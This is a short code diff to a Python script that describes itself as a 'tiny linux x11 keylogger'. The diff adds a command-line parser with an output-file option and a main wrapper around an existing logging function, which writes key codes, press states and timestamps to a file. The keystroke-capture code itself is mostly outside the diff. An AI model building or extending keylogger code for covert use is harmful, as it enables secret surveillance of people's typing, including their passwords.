@@ -39,6 +39,20 @@ def log(output_file, sleep_interval=0.005):
         output_file.write(pack(struct_format, key, pressed, int(time()*1000)))
         output_file.flush()
 
+def argparser():
+    import argparse
+    argp = argparse.ArgumentParser(description='peylogger - tiny linux x11 keylogger')
+    argp.add_argument('-o', '--output'
+                     ,help      = 'Output file - default is STDOUT'
+                     ,metavar   = 'FILE'
+                     ,default   = sys.stdout
+                     ,type      = argparse.FileType('w')
+                     )
+    return vars(argp.parse_args())
+
+def __main__():
+    args = argparser()
+    log(args['output'])
 
 if __name__ == "__main__":
-    log(sys.stdout)
+    __main__()
